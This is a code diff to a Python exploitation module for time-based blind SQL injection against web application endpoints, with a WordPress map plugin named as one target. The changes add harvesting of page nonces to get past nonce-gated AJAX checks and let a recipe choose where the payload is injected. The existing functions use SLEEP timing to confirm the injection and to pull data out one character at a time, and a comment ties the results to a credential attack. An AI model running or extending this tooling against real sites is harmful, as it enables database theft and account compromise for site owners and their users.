@@ -16,6 +16,8 @@ before it can feed the credential attack. This module does not pretend otherwise
 """
 import time
 
+from . import exploit as _exploit  # reuse the JS-nonce scraper
+
 _ASCII_HI = 127
 
 
@@ -27,7 +29,12 @@ def _timed(base_url, http, recipe, cond, sleep):
     method = recipe.get("method", "GET").upper()
     params = dict(recipe.get("params") or {})
     data = dict(recipe.get("data") or {})
-    (data if method == "POST" else params)[recipe["inject_param"]] = payload
+    # Where the injected param rides. Default: body for POST, query for GET. But a
+    # sink can read $_GET even on a POST request (wp-google-map-plugin reads
+    # $_GET['orderby'] while the ajax dispatch itself is POST) — 'inject_in' lets
+    # a recipe say so explicitly.
+    inject_in = recipe.get("inject_in") or ("data" if method == "POST" else "params")
+    (data if inject_in == "data" else params)[recipe["inject_param"]] = payload
     t0 = time.monotonic()
     try:
         if method == "POST":
@@ -39,10 +46,32 @@ def _timed(base_url, http, recipe, cond, sleep):
     return time.monotonic() - t0
 
 
+def _resolve_nonce(base_url, http, recipe):
+    """If the recipe's endpoint is nonce-gated, harvest the nonce once and return
+    a recipe copy with it placed into params/data. Harvested once per confirm()/
+    extract() (not per timed request) so it can't rotate mid-run. Returns the
+    recipe unchanged when no nonce is needed or none is found — in the latter case
+    the request simply fails the referer check and confirm() reports not-confirmed
+    (fail-safe: a wrong/absent nonce never yields a false positive)."""
+    nf = recipe.get("nonce_from")
+    if not nf:
+        return recipe
+    nonce = _exploit._harvest_js_nonce(
+        http, base_url.rstrip("/") + nf.get("url", "/"), nf["key"])
+    if not nonce:
+        return recipe
+    bucket = nf.get("into", "data")
+    out = dict(recipe)
+    out[bucket] = dict(recipe.get(bucket) or {})
+    out[bucket][nf.get("param", nf["key"])] = nonce
+    return out
+
+
 def confirm(base_url, http, recipe, delay=5, margin=1.5):
     """Confirm time-based blind SQLi. Injects SLEEP(delay) under a true
     condition and compares against a no-sleep control. Returns
     {confirmed, control_s, injected_s, delay} or None on transport error."""
+    recipe = _resolve_nonce(base_url, http, recipe)
     control = _timed(base_url, http, recipe, recipe.get("false_cond", "1=2"), 0)
     injected = _timed(base_url, http, recipe, recipe.get("true_cond", "1=1"), delay)
     if control is None or injected is None:
@@ -83,6 +112,7 @@ def _extract_char(base_url, http, recipe, expr, pos, delay, margin):
 def extract(base_url, http, recipe, expr, length=32, delay=3, margin=1.0):
     """Recover a scalar SQL expression char-by-char (bounded by `length`).
     SLOW: ~7 delayed requests per character. Stops at the first NUL/empty."""
+    recipe = _resolve_nonce(base_url, http, recipe)
     out = []
     for pos in range(1, length + 1):
         code = _extract_char(base_url, http, recipe, expr, pos, delay, margin)
